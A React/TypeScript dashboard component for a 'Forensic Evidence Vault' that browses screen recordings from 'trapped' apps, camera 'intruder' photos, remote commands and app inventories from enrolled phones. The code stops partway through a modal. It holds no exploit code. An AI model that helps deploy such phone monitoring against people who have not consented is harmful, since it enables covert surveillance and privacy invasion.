import React, { useEffect, useState, useMemo } from 'react';
import {
  Database,
  Film,
  Camera,
  Lock,
  Download,
  Play,
  RefreshCw,
  ShieldCheck,
  Search,
  Filter,
  Clock,
  Smartphone,
  FileText,
  X,
  ExternalLink,
  CheckCircle2,
} from 'lucide-react';
import { api } from '../services/api';
import { VaultOverviewData, VaultRecording, VaultPhoto } from '../types';

interface RenderDataVaultProps {
  onSelectDevice?: (deviceId: string) => void;
}

function formatBytes(bytes: number): string {
  if (!bytes || bytes <= 0) return '0 B';
  const units = ['B', 'KB', 'MB', 'GB'];
  let val = bytes;
  let unitIndex = 0;
  while (val >= 1024 && unitIndex < units.length - 1) {
    val /= 1024;
    unitIndex++;
  }
  return `${val.toFixed(1)} ${units[unitIndex]}`;
}

function formatDate(iso: string): string {
  try {
    const d = new Date(iso);
    if (isNaN(d.getTime())) return iso;
    return d.toLocaleString();
  } catch {
    return iso;
  }
}

export const RenderDataVault: React.FC<RenderDataVaultProps> = ({ onSelectDevice }) => {
  const [activeTab, setActiveTab] = useState<'recordings' | 'photos' | 'database' | 'encryption'>('recordings');
  const [overview, setOverview] = useState<VaultOverviewData | null>(null);
  const [recordings, setRecordings] = useState<VaultRecording[]>([]);
  const [photos, setPhotos] = useState<VaultPhoto[]>([]);
  const [dbDump, setDbDump] = useState<any>(null);
  const [loading, setLoading] = useState(true);

  // Filters & Search
  const [searchQuery, setSearchQuery] = useState('');
  const [deviceFilter, setDeviceFilter] = useState('ALL');
  const [typeFilter, setTypeFilter] = useState('ALL');

  // Modals
  const [activeVideo, setActiveVideo] = useState<VaultRecording | null>(null);
  const [activePhoto, setActivePhoto] = useState<VaultPhoto | null>(null);
  const [dbTable, setDbTable] = useState<'devices' | 'commands' | 'logs' | 'installedApps'>('devices');

  const loadAllVaultData = async () => {
    setLoading(true);
    try {
      const [ovData, recData, photoData, dbData] = await Promise.all([
        api.getVaultOverview(),
        api.getVaultRecordings(),
        api.getVaultPhotos(),
        api.getVaultDatabase(),
      ]);
      setOverview(ovData);
      setRecordings(recData);
      setPhotos(photoData);
      setDbDump(dbData);
    } catch (err) {
      console.error('Failed loading Render Vault data:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadAllVaultData();
  }, []);

  // Unique devices for filter dropdown
  const uniqueDevices = useMemo(() => {
    const map = new Map<string, string>();
    for (const r of recordings) {
      map.set(r.deviceId, r.deviceName || r.deviceId);
    }
    for (const p of photos) {
      if (!map.has(p.deviceId)) {
        map.set(p.deviceId, p.deviceName || p.deviceId);
      }
    }
    return Array.from(map.entries()).map(([id, name]) => ({ id, name }));
  }, [recordings, photos]);

  // Filtered recordings
  const filteredRecordings = useMemo(() => {
    return recordings.filter((r) => {
      if (deviceFilter !== 'ALL' && r.deviceId !== deviceFilter) return false;
      if (typeFilter !== 'ALL' && r.recordingType !== typeFilter) return false;
      if (searchQuery.trim()) {
        const q = searchQuery.toLowerCase();
        const app = (r.appName || '').toLowerCase();
        const fname = (r.filename || '').toLowerCase();
        const dev = (r.deviceName || '').toLowerCase();
        const pkg = (r.packageName || '').toLowerCase();
        if (!app.includes(q) && !fname.includes(q) && !dev.includes(q) && !pkg.includes(q)) {
          return false;
        }
      }
      return true;
    });
  }, [recordings, deviceFilter, typeFilter, searchQuery]);

  // Filtered photos
  const filteredPhotos = useMemo(() => {
    return photos.filter((p) => {
      if (deviceFilter !== 'ALL' && p.deviceId !== deviceFilter) return false;
      if (searchQuery.trim()) {
        const q = searchQuery.toLowerCase();
        const reason = (p.triggerReason || '').toLowerCase();
        const dev = (p.deviceName || '').toLowerCase();
        if (!reason.includes(q) && !dev.includes(q)) return false;
      }
      return true;
    });
  }, [photos, deviceFilter, searchQuery]);

  const stats = overview?.stats;

  return (
    <div className="space-y-6">
      {/* Top Banner / Header */}
      <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 sm:p-6 shadow-xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-96 h-96 bg-cyan-500/5 rounded-full blur-3xl pointer-events-none" />
        <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4 relative z-10">
          <div>
            <div className="flex flex-wrap items-center gap-2 mb-2">
              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-semibold bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">
                <Database className="w-3.5 h-3.5" />
                Render Cloud Storage Vault
              </span>
              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-semibold bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                <Lock className="w-3.5 h-3.5" />
                AES-256-GCM Encrypted at Rest
              </span>
            </div>
            <h1 className="text-xl sm:text-2xl font-bold text-white tracking-tight">
              Render Forensic Evidence Vault & Database Explorer
            </h1>
            <p className="text-sm text-slate-400 mt-1 max-w-2xl">
              Inspect all encrypted screen recordings, intruder photos, and database telemetry stored on the central Render backend across all client phones.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2.5 w-full sm:w-auto">
            <button
              onClick={loadAllVaultData}
              disabled={loading}
              className="flex-1 sm:flex-initial inline-flex items-center justify-center gap-2 px-3.5 py-2 rounded-xl text-sm font-medium bg-slate-800 text-slate-200 hover:bg-slate-700 hover:text-white border border-slate-700 transition"
              title="Refresh Vault Data"
            >
              <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
              <span>Refresh</span>
            </button>
            <a
              href={api.getVaultExportUrl()}
              download
              className="flex-1 sm:flex-initial inline-flex items-center justify-center gap-2 px-4 py-2 rounded-xl text-sm font-semibold bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white shadow-lg shadow-cyan-500/20 transition"
              title="Download full JSON database backup"
            >
              <Download className="w-4 h-4" />
              <span>Export Database (JSON)</span>
            </a>
          </div>
        </div>

        {/* Storage & Encryption Metric Cards */}
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4 mt-6">
          <div className="bg-slate-800/60 border border-slate-700/60 rounded-xl p-3.5 sm:p-4">
            <div className="flex items-center justify-between text-slate-400 text-xs font-medium mb-1">
              <span>All Stored Videos</span>
              <Film className="w-4 h-4 text-purple-400" />
            </div>
            <div className="text-xl sm:text-2xl font-bold text-white">
              {stats?.totalRecordings ?? 0}
            </div>
            <div className="text-xs text-slate-400 mt-1 flex items-center justify-between">
              <span>Disk Size:</span>
              <span className="font-semibold text-purple-300">
                {formatBytes(stats?.recordingsDiskBytes ?? 0)}
              </span>
            </div>
          </div>

          <div className="bg-slate-800/60 border border-slate-700/60 rounded-xl p-3.5 sm:p-4">
            <div className="flex items-center justify-between text-slate-400 text-xs font-medium mb-1">
              <span>All Forensic Photos</span>
              <Camera className="w-4 h-4 text-cyan-400" />
            </div>
            <div className="text-xl sm:text-2xl font-bold text-white">
              {stats?.totalPhotos ?? 0}
            </div>
            <div className="text-xs text-slate-400 mt-1 flex items-center justify-between">
              <span>Disk Size:</span>
              <span className="font-semibold text-cyan-300">
                {formatBytes(stats?.photosDiskBytes ?? 0)}
              </span>
            </div>
          </div>

          <div className="bg-slate-800/60 border border-slate-700/60 rounded-xl p-3.5 sm:p-4">
            <div className="flex items-center justify-between text-slate-400 text-xs font-medium mb-1">
              <span>Database Telemetry</span>
              <FileText className="w-4 h-4 text-emerald-400" />
            </div>
            <div className="text-xl sm:text-2xl font-bold text-white">
              {(stats?.totalLogs ?? 0) + (stats?.totalCommands ?? 0)}
            </div>
            <div className="text-xs text-slate-400 mt-1 flex items-center justify-between">
              <span>DB File:</span>
              <span className="font-semibold text-emerald-300">
                {formatBytes(stats?.dbSizeBytes ?? 0)}
              </span>
            </div>
          </div>

          <div className="bg-slate-800/60 border border-slate-700/60 rounded-xl p-3.5 sm:p-4">
            <div className="flex items-center justify-between text-slate-400 text-xs font-medium mb-1">
              <span>Storage Cipher</span>
              <ShieldCheck className="w-4 h-4 text-amber-400" />
            </div>
            <div className="text-base sm:text-lg font-bold text-amber-300">
              AES-256-GCM
            </div>
            <div className="text-xs text-slate-400 mt-1 flex items-center justify-between">
              <span>Status:</span>
              <span className="font-semibold text-emerald-400">ENCRYPTED AT REST</span>
            </div>
          </div>
        </div>
      </div>

      {/* Main Tab Switcher */}
      <div className="flex items-center gap-2 border-b border-slate-800 pb-2 overflow-x-auto">
        <button
          onClick={() => setActiveTab('recordings')}
          className={`flex items-center gap-2 px-4 py-2.5 rounded-xl text-sm font-semibold transition whitespace-nowrap ${
            activeTab === 'recordings'
              ? 'bg-purple-500/15 text-purple-400 border border-purple-500/30'
              : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
          }`}
        >
          <Film className="w-4 h-4" />
          <span>All Videos ({recordings.length})</span>
        </button>

        <button
          onClick={() => setActiveTab('photos')}
          className={`flex items-center gap-2 px-4 py-2.5 rounded-xl text-sm font-semibold transition whitespace-nowrap ${
            activeTab === 'photos'
              ? 'bg-cyan-500/15 text-cyan-400 border border-cyan-500/30'
              : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
          }`}
        >
          <Camera className="w-4 h-4" />
          <span>All Photos ({photos.length})</span>
        </button>

        <button
          onClick={() => setActiveTab('database')}
          className={`flex items-center gap-2 px-4 py-2.5 rounded-xl text-sm font-semibold transition whitespace-nowrap ${
            activeTab === 'database'
              ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30'
              : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
          }`}
        >
          <Database className="w-4 h-4" />
          <span>Database Explorer</span>
        </button>

        <button
          onClick={() => setActiveTab('encryption')}
          className={`flex items-center gap-2 px-4 py-2.5 rounded-xl text-sm font-semibold transition whitespace-nowrap ${
            activeTab === 'encryption'
              ? 'bg-amber-500/15 text-amber-400 border border-amber-500/30'
              : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
          }`}
        >
          <Lock className="w-4 h-4" />
          <span>Encryption & Storage Architecture</span>
        </button>
      </div>

      {/* Filter Bar (for Videos and Photos) */}
      {(activeTab === 'recordings' || activeTab === 'photos') && (
        <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-3 bg-slate-900/60 border border-slate-800 rounded-xl p-3">
          <div className="relative flex-1">
            <Search className="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Search by app name, device, filename..."
              className="w-full bg-slate-800/80 border border-slate-700/80 rounded-lg pl-9 pr-3 py-1.5 text-sm text-slate-200 placeholder-slate-500 focus:outline-none focus:border-cyan-500"
            />
          </div>

          <div className="flex items-center gap-2">
            <div className="flex items-center gap-1.5 bg-slate-800/80 border border-slate-700/80 rounded-lg px-2.5 py-1.5 text-xs text-slate-300">
              <Smartphone className="w-3.5 h-3.5 text-slate-400" />
              <select
                value={deviceFilter}
                onChange={(e) => setDeviceFilter(e.target.value)}
                className="bg-transparent text-slate-200 focus:outline-none cursor-pointer"
              >
                <option value="ALL">All Devices ({uniqueDevices.length})</option>
                {uniqueDevices.map((d) => (
                  <option key={d.id} value={d.id}>
                    {d.name}
                  </option>
                ))}
              </select>
            </div>

            {activeTab === 'recordings' && (
              <div className="flex items-center gap-1.5 bg-slate-800/80 border border-slate-700/80 rounded-lg px-2.5 py-1.5 text-xs text-slate-300">
                <Filter className="w-3.5 h-3.5 text-slate-400" />
                <select
                  value={typeFilter}
                  onChange={(e) => setTypeFilter(e.target.value)}
                  className="bg-transparent text-slate-200 focus:outline-none cursor-pointer"
                >
                  <option value="ALL">All Types</option>
                  <option value="APP_TRAP">App Traps</option>
                  <option value="LIVE_SCREEN">Live Screen</option>
                </select>
              </div>
            )}
          </div>
        </div>
      )}

      {/* TAB 1: ALL RECORDINGS */}
      {activeTab === 'recordings' && (
        <div>
          {loading ? (
            <div className="p-12 text-center text-slate-400">Loading videos from Render cloud vault...</div>
          ) : filteredRecordings.length === 0 ? (
            <div className="bg-slate-900/50 border border-dashed border-slate-800 rounded-2xl p-12 text-center">
              <Film className="w-12 h-12 text-slate-600 mx-auto mb-3" />
              <h3 className="text-base font-semibold text-slate-300">No Videos Found</h3>
              <p className="text-sm text-slate-500 mt-1 max-w-md mx-auto">
                {recordings.length === 0
                  ? 'No recordings have been uploaded to Render yet. Open a trapped app on a client phone to capture screen activity.'
                  : 'No recordings match your current search/device filter.'}
              </p>
            </div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {filteredRecordings.map((rec) => {
                const dateStr = formatDate(rec.createdAt || rec.timestamp);
                return (
                  <div
                    key={rec.id}
                    className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden hover:border-purple-500/40 transition flex flex-col justify-between group shadow-lg"
                  >
                    <div className="p-4">
                      {/* Top Badges */}
                      <div className="flex items-center justify-between gap-2 mb-3">
                        <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-semibold bg-purple-500/10 text-purple-400 border border-purple-500/20">
                          <Film className="w-3 h-3" />
                          {rec.recordingType === 'APP_TRAP' ? 'App Trap' : 'Live Screen'}
                        </span>
                        <span className="text-xs text-slate-400 flex items-center gap-1">
                          <Clock className="w-3 h-3" />
                          {rec.duration || '00:30'}
                        </span>
                      </div>

                      {/* Title / App */}
                      <h4 className="text-base font-semibold text-white group-hover:text-purple-300 transition truncate">
                        {rec.appName || 'Unknown App'}
                      </h4>
                      <p className="text-xs text-slate-400 truncate mt-0.5" title={rec.filename}>
                        {rec.filename}
                      </p>

                      {/* Device Info */}
                      <div className="mt-3 pt-3 border-t border-slate-800/80 flex items-center justify-between text-xs">
                        <button
                          type="button"
                          onClick={() => onSelectDevice?.(rec.deviceId)}
                          className="text-slate-400 hover:text-cyan-300 flex items-center gap-1.5 truncate max-w-[180px] transition text-left"
                          title="Open this phone in Device Live Control"
                        >
                          <Smartphone className="w-3.5 h-3.5 text-cyan-400" />
                          <span className="truncate">{rec.deviceName || rec.deviceId}</span>
                        </button>
                        <span className="text-slate-500 font-mono">
                          {formatBytes(rec.sizeBytes)}
                        </span>
                      </div>

                      <div className="text-[11px] text-slate-500 mt-1">
                        {dateStr}
                      </div>
                    </div>

                    {/* Action Footer */}
                    <div className="bg-slate-850 border-t border-slate-800 p-2.5 px-4 flex items-center justify-between gap-2">
                      <button
                        onClick={() => setActiveVideo(rec)}
                        className="inline-flex items-center gap-1.5 text-xs font-semibold text-purple-400 hover:text-purple-300"
                      >
                        <Play className="w-3.5 h-3.5 fill-current" />
                        <span>Watch Video</span>
                      </button>

                      <a
                        href={rec.url}
                        download={`${rec.appName || 'recording'}_${rec.id}.mp4`}
                        className="inline-flex items-center gap-1.5 text-xs font-medium text-slate-400 hover:text-slate-200"
                        title="Download decrypted MP4"
                      >
                        <Download className="w-3.5 h-3.5" />
                        <span>Download</span>
                      </a>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      )}

      {/* TAB 2: ALL PHOTOS */}
      {activeTab === 'photos' && (
        <div>
          {loading ? (
            <div className="p-12 text-center text-slate-400">Loading photos from Render cloud vault...</div>
          ) : filteredPhotos.length === 0 ? (
            <div className="bg-slate-900/50 border border-dashed border-slate-800 rounded-2xl p-12 text-center">
              <Camera className="w-12 h-12 text-slate-600 mx-auto mb-3" />
              <h3 className="text-base font-semibold text-slate-300">No Photos Stored</h3>
              <p className="text-sm text-slate-500 mt-1 max-w-md mx-auto">
                No camera photos or proofs found. Trigger "Snap Cameras" or save a screen proof from the device live view.
              </p>
            </div>
          ) : (
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
              {filteredPhotos.map((photo) => {
                const frontUrl = photo.frontPhotoUrl;
                const backUrl = photo.backPhotoUrl;
                const screenUrl = photo.screenPhotoUrl;
                const previewImg = frontUrl || backUrl || screenUrl;

                return (
                  <div
                    key={photo.id}
                    className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden hover:border-cyan-500/40 transition flex flex-col justify-between shadow-lg"
                  >
                    <div className="p-3">
                      <div className="aspect-video bg-black rounded-lg overflow-hidden relative group cursor-pointer"
                           onClick={() => setActivePhoto(photo)}>
                        {previewImg ? (
                          <img
                            src={previewImg}
                            alt="Forensic Photo"
                            className="w-full h-full object-cover group-hover:scale-105 transition duration-300"
                          />
                        ) : (
                          <div className="w-full h-full flex items-center justify-center text-slate-600">
                            <Camera className="w-8 h-8" />
                          </div>
                        )}
                        <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 transition flex items-center justify-center gap-2 text-white text-xs font-semibold">
                          <ExternalLink className="w-4 h-4" />
                          <span>View Full Photo</span>
                        </div>
                      </div>

                      <div className="mt-3">
                        <div className="flex items-center justify-between gap-2 text-xs">
                          <span className="font-semibold text-white truncate">
                            {photo.triggerReason || 'Intruder / Manual Snap'}
                          </span>
                          <span className="text-slate-400 text-[11px]">
                            {formatDate(photo.createdAt || photo.timestamp)}
                          </span>
                        </div>
                        <button
                          type="button"
                          onClick={() => onSelectDevice?.(photo.deviceId)}
                          className="text-xs text-slate-400 hover:text-cyan-300 mt-1 flex items-center gap-1.5 transition text-left"
                          title="Open this phone in Device Live Control"
                        >
                          <Smartphone className="w-3.5 h-3.5 text-cyan-400" />
                          <span className="truncate">{photo.deviceName || photo.deviceId}</span>
                        </button>
                      </div>
                    </div>

                    <div className="bg-slate-850 border-t border-slate-800 p-2.5 px-4 flex items-center justify-between text-xs">
                      <span className="text-slate-400">
                        {frontUrl && backUrl ? 'Front + Back Dual Shot' : frontUrl ? 'Front Camera' : backUrl ? 'Back Camera' : 'Screen Proof'}
                      </span>
                      {previewImg && (
                        <a
                          href={previewImg}
                          download={`photo_${photo.id}.jpg`}
                          className="text-cyan-400 hover:text-cyan-300 font-medium flex items-center gap-1"
                        >
                          <Download className="w-3.5 h-3.5" />
                          <span>Download</span>
                        </a>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      )}

      {/* TAB 3: DATABASE EXPLORER */}
      {activeTab === 'database' && (
        <div className="space-y-4">
          <div className="flex flex-wrap items-center justify-between gap-3 bg-slate-900 border border-slate-800 rounded-xl p-3 sm:p-4">
            <div className="flex items-center gap-2 overflow-x-auto">
              <button
                onClick={() => setDbTable('devices')}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition ${
                  dbTable === 'devices' ? 'bg-cyan-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-slate-700'
                }`}
              >
                Devices ({dbDump?.devices?.length || 0})
              </button>
              <button
                onClick={() => setDbTable('commands')}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition ${
                  dbTable === 'commands' ? 'bg-cyan-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-slate-700'
                }`}
              >
                Commands ({dbDump?.commands?.length || 0})
              </button>
              <button
                onClick={() => setDbTable('logs')}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition ${
                  dbTable === 'logs' ? 'bg-cyan-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-slate-700'
                }`}
              >
                Telemetry Logs ({dbDump?.logs?.length || 0})
              </button>
              <button
                onClick={() => setDbTable('installedApps')}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition ${
                  dbTable === 'installedApps' ? 'bg-cyan-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-slate-700'
                }`}
              >
                Installed Apps ({dbDump?.installedApps?.length || 0})
              </button>
            </div>

            <div className="text-xs text-slate-400 font-mono">
              Source: edr_database.json ({formatBytes(stats?.dbSizeBytes ?? 0)})
            </div>
          </div>

          {/* Table Container */}
          <div className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden shadow-xl">
            <div className="overflow-x-auto max-h-[500px]">
              <table className="w-full text-left text-xs text-slate-300">
                <thead className="bg-slate-800/80 text-slate-400 uppercase font-mono sticky top-0 border-b border-slate-700">
                  {dbTable === 'devices' && (
                    <tr>
                      <th className="py-2.5 px-3">Device Name</th>
                      <th className="py-2.5 px-3">Device ID</th>
                      <th className="py-2.5 px-3">Status</th>
                      <th className="py-2.5 px-3">OS Version</th>
                      <th className="py-2.5 px-3">Battery</th>
                      <th className="py-2.5 px-3">Enrolled At</th>
                    </tr>
                  )}
                  {dbTable === 'commands' && (
                    <tr>
                      <th className="py-2.5 px-3">Command Type</th>
                      <th className="py-2.5 px-3">Device ID</th>
                      <th className="py-2.5 px-3">Status</th>
                      <th className="py-2.5 px-3">Result Message</th>
                      <th className="py-2.5 px-3">Timestamp</th>
                    </tr>
                  )}
                  {dbTable === 'logs' && (
                    <tr>
                      <th className="py-2.5 px-3">Severity</th>
                      <th className="py-2.5 px-3">Event Type</th>
                      <th className="py-2.5 px-3">Message</th>
                      <th className="py-2.5 px-3">Device</th>
                      <th className="py-2.5 px-3">Timestamp</th>
                    </tr>
                  )}
                  {dbTable === 'installedApps' && (
                    <tr>
                      <th className="py-2.5 px-3">App Name</th>
                      <th className="py-2.5 px-3">Package Name</th>
                      <th className="py-2.5 px-3">Version</th>
                      <th className="py-2.5 px-3">Type</th>
                      <th className="py-2.5 px-3">Device</th>
                    </tr>
                  )}
                </thead>
                <tbody className="divide-y divide-slate-800">
                  {dbTable === 'devices' &&
                    (dbDump?.devices || []).map((d: any) => (
                      <tr key={d.id} className="hover:bg-slate-800/40">
                        <td className="py-2 px-3 font-semibold text-white">{d.deviceName}</td>
                        <td className="py-2 px-3 font-mono text-slate-400">{d.deviceId}</td>
                        <td className="py-2 px-3">
                          <span
                            className={`inline-block px-2 py-0.5 rounded text-[11px] font-semibold ${
                              d.status === 'ONLINE' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'
                            }`}
                          >
                            {d.status}
                          </span>
                        </td>
                        <td className="py-2 px-3 text-slate-400">{d.osVersion}</td>
                        <td className="py-2 px-3 font-mono">{d.batteryLevel}%</td>
                        <td className="py-2 px-3 text-slate-500">{formatDate(d.enrolledAt)}</td>
                      </tr>
                    ))}

                  {dbTable === 'commands' &&
                    (dbDump?.commands || []).map((c: any) => (
                      <tr key={c.id} className="hover:bg-slate-800/40">
                        <td className="py-2 px-3 font-semibold text-cyan-300 font-mono">{c.commandType}</td>
                        <td className="py-2 px-3 font-mono text-slate-400">{c.deviceId}</td>
                        <td className="py-2 px-3">
                          <span className="inline-block px-2 py-0.5 rounded text-[11px] font-semibold bg-slate-800 text-slate-300">
                            {c.status}
                          </span>
                        </td>
                        <td className="py-2 px-3 text-slate-400">{c.resultMessage || '-'}</td>
                        <td className="py-2 px-3 text-slate-500">{formatDate(c.createdAt)}</td>
                      </tr>
                    ))}

                  {dbTable === 'logs' &&
                    (dbDump?.logs || []).map((l: any) => (
                      <tr key={l.id} className="hover:bg-slate-800/40">
                        <td className="py-2 px-3">
                          <span
                            className={`inline-block px-2 py-0.5 rounded text-[10px] font-bold ${
                              l.severity === 'CRITICAL'
                                ? 'bg-rose-500/20 text-rose-400'
                                : l.severity === 'WARNING'
                                ? 'bg-amber-500/20 text-amber-400'
                                : 'bg-slate-800 text-slate-300'
                            }`}
                          >
                            {l.severity}
                          </span>
                        </td>
                        <td className="py-2 px-3 font-mono text-slate-400">{l.eventType}</td>
                        <td className="py-2 px-3 text-slate-200">{l.message}</td>
                        <td className="py-2 px-3 font-mono text-slate-500">{l.deviceId}</td>
                        <td className="py-2 px-3 text-slate-500">{formatDate(l.eventTimestamp || l.createdAt)}</td>
                      </tr>
                    ))}

                  {dbTable === 'installedApps' &&
                    (dbDump?.installedApps || []).map((a: any) => (
                      <tr key={a.id || a.packageName} className="hover:bg-slate-800/40">
                        <td className="py-2 px-3 font-semibold text-white">{a.appName}</td>
                        <td className="py-2 px-3 font-mono text-slate-400">{a.packageName}</td>
                        <td className="py-2 px-3 text-slate-400">{a.versionName}</td>
                        <td className="py-2 px-3">
                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-slate-800 text-slate-400">
                            {a.isSystemApp ? 'SYSTEM' : 'USER'}
                          </span>
                        </td>
                        <td className="py-2 px-3 font-mono text-slate-500">{a.deviceId}</td>
                      </tr>
                    ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      {/* TAB 4: ENCRYPTION & ARCHITECTURE */}
      {activeTab === 'encryption' && (
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 space-y-6">
          <div>
            <h3 className="text-lg font-bold text-white flex items-center gap-2">
              <Lock className="w-5 h-5 text-emerald-400" />
              Render Cloud Security & Encryption Architecture
            </h3>
            <p className="text-sm text-slate-400 mt-1">
              Every video, photo, and forensic artifact stored on Render is encrypted before being written to disk.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="bg-slate-800/60 border border-slate-700/60 rounded-xl p-4 space-y-2.5">
              <h4 className="text-sm font-semibold text-cyan-300">Encryption Details</h4>
              <ul className="text-xs space-y-2 text-slate-300">
                <li className="flex items-start justify-between">
                  <span className="text-slate-400">Algorithm:</span>
                  <span className="font-mono font-semibold text-white">AES-256-GCM (Authenticated)</span>
                </li>
                <li className="flex items-start justify-between">
                  <span className="text-slate-400">Authentication Tag:</span>
                  <span className="font-mono text-white">128-bit (16 bytes)</span>
                </li>
                <li className="flex items-start justify-between">
                  <span className="text-slate-400">Initialization Vector:</span>
                  <span className="font-mono text-white">96-bit (12 bytes random IV)</span>
                </li>
                <li className="flex items-start justify-between">
                  <span className="text-slate-400">Magic File Prefix:</span>
                  <span className="font-mono text-emerald-400">EDR1 (0x45 0x44 0x52 0x31)</span>
                </li>
                <li className="flex items-start justify-between">
                  <span className="text-slate-400">Key Derivation:</span>
                  <span className="font-mono text-white">SHA-256 of EDR_ENCRYPTION_KEY</span>
                </li>
              </ul>
            </div>

            <div className="bg-slate-800/60 border border-slate-700/60 rounded-xl p-4 space-y-2.5">
              <h4 className="text-sm font-semibold text-cyan-300">Server Storage Paths</h4>
              <ul className="text-xs space-y-2 text-slate-300">
                <li className="flex flex-col">
                  <span className="text-slate-400">Recordings Directory:</span>
                  <span className="font-mono text-purple-300 break-all text-[11px] mt-0.5">
                    {overview?.storagePaths?.recordingsDir || '/opt/render/project/src/backend/uploads/recordings'}
                  </span>
                </li>
                <li className="flex flex-col">
                  <span className="text-slate-400">Photos Directory:</span>
                  <span className="font-mono text-cyan-300 break-all text-[11px] mt-0.5">
                    {overview?.storagePaths?.photosDir || '/opt/render/project/src/backend/uploads/photos'}
                  </span>
                </li>
                <li className="flex flex-col">
                  <span className="text-slate-400">Database JSON File:</span>
                  <span className="font-mono text-emerald-300 break-all text-[11px] mt-0.5">
                    {overview?.storagePaths?.databaseFile || '/opt/render/project/src/backend/data/edr_database.json'}
                  </span>
                </li>
              </ul>
            </div>
          </div>

          <div className="bg-slate-800/40 border border-slate-700/40 rounded-xl p-4 text-xs text-slate-400 space-y-2">
            <div className="flex items-center gap-2 text-emerald-400 font-semibold text-sm">
              <CheckCircle2 className="w-4 h-4" />
              <span>Decryption on Demand</span>
            </div>
            <p>
              When an administrator streams or downloads a video from the dashboard, the backend decrypts the ciphertext in RAM on-the-fly via <code>readAndDecryptFile()</code>. Plaintext is never saved to the Render hard drive, ensuring maximum zero-trust forensic protection.
            </p>
          </div>
        </div>
      )}

      {/* VIDEO MODAL PLAYER */}
      {activeVideo && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl max-w-3xl w-full overflow-hidden shadow-2xl animate-in fade-in zoom-in-95 duration-200">
            <div className="p-4 border-b border-slate-800 flex items-center justify-between">
              <div>
                <h3 className="text-base font-bold text-white flex items-center gap-2">
                  <Film className="w-4 h-4 text-purple-400" />
                  {activeVideo.appName || 'Video Recording'}
                </h3>
                <p className="text-xs text-slate-400 mt-0.5">
                  Device: {activeVideo.deviceName || activeVideo.deviceId} • {formatDate(activeVideo.createdAt || activeVideo.timestamp)}
                </p>
              </div>
              <button
                onClick={() => setActiveVideo(null)}
                className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="bg-black aspect-video flex items-center justify-center">
              <video
                src={activeVideo.url}
                controls
                autoPlay
                className="w-full h-full object-contain"
              />
            </div>

            <div className="p-4 border-t border-slate-800 flex items-center justify-between bg-slate-900/60">
              <span className="text-xs text-slate-400 font-mono">
                Size: {formatBytes(activeVideo.sizeBytes)} • Duration: {activeVideo.duration || '00:30'}
              </span>
              <a
                href={activeVideo.url}
                download={`${activeVideo.appName || 'video'}.mp4`}
                className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-lg text-xs font-semibold bg-purple-600 hover:bg-purple-500 text-white transition"
              >
                <Download className="w-3.5 h-3.5" />
                <span>Download MP4</span>
              </a>
            </div>
          </div>
        </div>
      )}

      {/* PHOTO LIGHTBOX MODAL */}
      {activePhoto && (
        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-sm flex items-center justify-center p-4" onClick={() => setActivePhoto(null)}>
          <div className="bg-slate-900 border border-slate-800 rounded-2xl max-w-4xl w-full overflow-hidden shadow-2xl" onClick={(e) => e.stopPropagation()}>
            <div className="p-4 border-b border-slate-800 flex items-center justify-between">
              <div>
                <h3 className="text-base font-bold text-white flex items-center gap-2">
                  <Camera className="w-4 h-4 text-cyan-400" />
                  {activePhoto.triggerReason || 'Forensic Photo Evidence'}
                </h3>
                <p className="text-xs text-slate-400 mt-0.5">
                  Device: {activePhoto.deviceName || activePhoto.deviceId} • {formatDate(activePhoto.createdAt || activePhoto.timestamp)}
                </p>
              </div>
              <button
                onClick={() => setActivePhoto(null)}
